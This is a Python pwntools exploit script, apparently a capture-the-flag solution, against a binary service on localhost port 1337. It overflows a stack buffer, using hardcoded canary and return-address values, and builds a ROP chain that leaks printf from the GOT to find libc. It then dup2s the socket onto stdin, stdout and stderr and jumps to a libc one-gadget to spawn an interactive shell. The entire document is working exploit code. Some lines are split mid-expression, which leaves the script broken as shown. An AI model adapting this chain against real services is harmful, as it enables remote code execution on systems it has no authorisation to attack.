from pwn import *

#context.log_level = 'debug'
context(arch='amd64')
binary = ELF('./exploit')
p = remote('localhost', 1337)
libc = ELF('libc.so')

canary = 0x74f9d8a238a1f600
rbp = 0x7ffcf3e68010
returnAddr = 0x5637362b1562

pie = returnAddr - 0x1562 #look at r2 too for pie offset
log.info('Base pie address: ' + hex(pie))
log.info('Canary: ' + hex(canary))
#leaking libc
#0x164b -> pop rdi; ret
#0x1649: pop rsi; pop r15; ret;
#0x1265: pop rdx; ret; set it to 8 because pointer leak
#call write

poprdi = pie + 0x164b
poprsir15 = pie + 0x1649
poprdx = pie + 0x1265
write = pie + 0x154e
printfgot = pie + binary.got['printf']
chain = p64(poprdi) + p64(4) + p64(poprsir15) + p64(printfgot) + p64(0) + p64(poprdx) + p64(8) + p64
(write)
payload = 'A' * 0x38 + p64(canary) + p64(rbp) + chain
p.sendlineafter('admin:\n', payload)
temp = p.recv(8)
printf = u64(temp)
libcBase = printf - libc.symbols['printf']
log.info('Leaked libc: ' + hex(libcBase))
p.close()
#popping shells
log.info('Popping a shell...')
p = remote('localhost', 1337)
libc.address = libcBase
#now dup2 everything and pop shell
payload = ''
payload += 'A' * 0x38
payload += p64(canary)
payload += p64(rbp)

payload += p64(poprdi)
payload += p64(0x4)
payload += p64(poprsir15)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(libc.symbols['dup2'])

payload += p64(poprdi)
payload += p64(0x4)
payload += p64(poprsir15)
payload += p64(0x1)
payload += p64(0x0)
payload += p64(libc.symbols['dup2'])

payload += p64(poprdi)
payload += p64(0x4)
payload += p64(poprsir15)
payload += p64(0x2)
payload += p64(0x0)
payload += p64(libc.symbols['dup2'])

payload += p64(poprdi)
payload += p64(0x4)
payload += p64(poprsir15)
payload += p64(0x3)
payload += p64(0x0)
payload += p64(libc.symbols['dup2'])

payload += p64(libc.address + 0x3eb0b) #pop rcx; ret, rop gadget from libc! the next one gadget requires
rcx to be null
payload += p64(0)
payload += p64(libc.address + 0x4f2c5) # one gadget magic

p.sendafter('admin:\n', payload)
p.interactive()
